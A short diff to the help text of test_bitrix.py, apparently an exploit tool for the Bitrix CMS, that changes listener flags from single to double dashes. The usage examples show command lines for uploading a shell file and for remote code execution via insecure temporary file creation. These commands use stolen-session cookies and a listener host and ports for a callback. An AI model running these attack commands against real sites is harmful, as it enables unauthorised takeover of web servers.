@@ -1096,10 +1096,10 @@ def main():
         python3 test_bitrix.py -t https://example.com vote_htaccess -p shell.html
         
     RCE via Insecure Temporary File Creation (the path of the login url can be taken from the scanner):
-        python3 test_bitrix.py -t https://example.com tmp_file_create -r bitrix/components/bitrix/map.yandex.search/settings/settings.php?login=yes -l user -p 123456 -lhost 192.168.1.11 -lport1 8001 -lport2 9001
+        python3 test_bitrix.py -t https://example.com tmp_file_create -r bitrix/components/bitrix/map.yandex.search/settings/settings.php?login=yes -l user -p 123456 --lhost 192.168.1.11 --lport1 8001 --lport2 9001
         OR
         create file cached-creds.txt in the same directory as the Python3 exploit code, and write down PHPSESSID:sessid value, then run the command below
-        python3 test_bitrix.py -t https://example.com tmp_file_create -lhost 192.168.1.11 -lport1 8001 -lport2 9001
+        python3 test_bitrix.py -t https://example.com tmp_file_create --lhost 192.168.1.11 --lport1 8001 --lport2 9001
     """,
         formatter_class=Formatter
     )
